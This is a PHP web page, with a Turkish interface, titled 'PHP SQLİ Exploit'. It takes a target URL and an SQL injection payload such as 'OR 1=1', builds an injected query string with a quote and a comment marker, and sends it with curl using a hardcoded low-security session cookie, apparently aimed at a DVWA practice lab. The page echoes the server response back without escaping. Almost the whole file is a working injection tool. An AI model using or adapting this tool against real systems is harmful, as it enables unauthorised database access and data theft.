<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP SQLİ Exploit</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
    <link rel="icon" href="https://i.hizliresim.com/6kjk1mb.png" type="image/png">
</head>
<body class="bg-gray-900 text-white flex flex-col justify-center items-center h-screen">
    <img src="https://i.hizliresim.com/6kjk1mb.png" alt="tht-arge" class="w-24 h-24 mb-8">
    <p class="text-lg">PHP For Hackers \ PHP Exploit</p>

    <div class="mt-8">
        <form action="sqli.php" method="post">
            <label for="vulnerpage" class="block mb-2">Zafiyetli Bağlantı</label>
                <input type="text" name="vulnerpage" class="w-full py-2 px-3 mb-4 rounded-lg focus:outline-none focus:ring focus:border-blue-300 bg-gray-800" size="50">
                    <label for="payload" class="block mb-2">Poc Payload OR 1=1</label>
                <input type="text" name="sqlipayload" class="w-35 py-2 px-4 mb-4 rounded-lg focus:outline-none focus:ring focus:border-blue-300 bg-gray-800">
            <button type="submit" class="bg-blue-800 hover:bg-blue-500 text-white py-2 px-3 rounded-lg" name="sendrequests">Gönder</button>
        </form>
    </div>

    <?php
    if (isset($_POST["sendrequests"])) {

        $vulnerpage = $_POST["vulnerpage"];
        $sqlipayload = $_POST["sqlipayload"];
        $sqlipayload = urlencode($sqlipayload);
            
     
        $hacked = $vulnerpage."1'".$sqlipayload."%23"."&Submit=Submit#";

       
        echo "Gönderilen istek: " . htmlspecialchars($hacked);
     
        $curl = curl_init();

     
        curl_setopt_array($curl, [
            CURLOPT_URL => $hacked,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIE => "security=low; PHPSESSID=glhrmefqaqtjsjisv1kccbqm6a"
        ]);

     
        $result = curl_exec($curl);
        echo $result;
        curl_close($curl);
    }
    ?>

</body>
</html>
